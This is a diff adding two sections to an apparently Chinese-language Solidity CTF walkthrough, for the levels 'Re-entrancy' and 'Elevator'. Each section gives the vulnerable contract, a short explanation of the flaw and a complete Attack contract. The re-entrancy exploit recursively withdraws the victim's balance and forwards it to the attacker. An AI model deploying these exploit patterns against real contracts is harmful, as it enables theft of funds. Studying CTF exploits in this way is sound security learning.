@@ -447,3 +447,136 @@ contract Attack {
     }
 }
 ```
+
+# Re-entrancy
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+这道题是经典的重入漏洞；Reentrance 合约的 withdraw 函数在确保调用者有足够余额后，会将资金发送到调用者的地址。关键是在发送资金和更新余额之间，由于使用 call 方法，合约允许调用者的回退（fallback）方法执行，从而可能再次调用 withdraw 函数。如果回退方法中再次调用 withdraw，并且合约状态尚未更新，这将导致重入攻击。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.12;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Attack {
+    IReentrance public victimContract = IReentrance(0xFd0d5031eA1e5169a6C080a30069042a10CbC59b);
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    receive() external payable {
+        if (address(victimContract).balance >= 0.001 ether) {
+            victimContract.withdraw(0.001 ether);
+        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
+            victimContract.withdraw(address(victimContract).balance);
+        }
+    }
+
+    function attack() public payable {
+        victimContract.donate{value: 0.001 ether}(address(this));
+        victimContract.withdraw(0.001 ether);
+    }
+
+    function getFunds() public {
+       payable(owner).transfer(address(this).balance);
+    }
+}
+```
+attack 的时候传 0.001 ether 即可。
+
+# Elevator
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
+```solidity
+if (!building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;    
+}
+
+contract Attack {
+    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
+    bool public toggle = true;
+
+    constructor(){}
+    
+    function isLastFloor(uint256) public returns (bool){
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack() public payable {
+        victimContract.goTo(1);
+    }
+}
+```
+
+这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。
